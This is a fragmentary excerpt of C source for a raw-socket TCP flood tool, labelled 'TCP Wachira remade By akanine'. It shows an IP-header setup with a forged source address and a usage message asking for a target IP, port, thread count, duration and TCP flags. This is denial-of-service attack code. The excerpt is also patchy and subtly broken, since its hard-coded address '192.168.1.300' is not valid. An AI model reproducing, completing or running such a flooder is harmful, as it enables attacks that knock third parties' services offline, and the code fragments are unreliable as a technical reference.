...
void setup_ip_header(struct iphdr *iph)
{
	...
	iph->protocol = 6;
	iph->check = 0;
	iph->saddr = inet_addr("192.168.1.300");
}
...
{
	if(argc < 7){
	fprintf(stderr, "TCP Wachira remade By akanine \n");
	fprintf(stdout, "TCP-Flood: %s <IP> <PORT> <THREADS> <-1> <TIME> <ack,syn,psh,fin,rst,urg,ptr,res2,seq>\n", argv[0]);
	exit(-1);
	}
	fprintf(stdout, "Steup...\n");
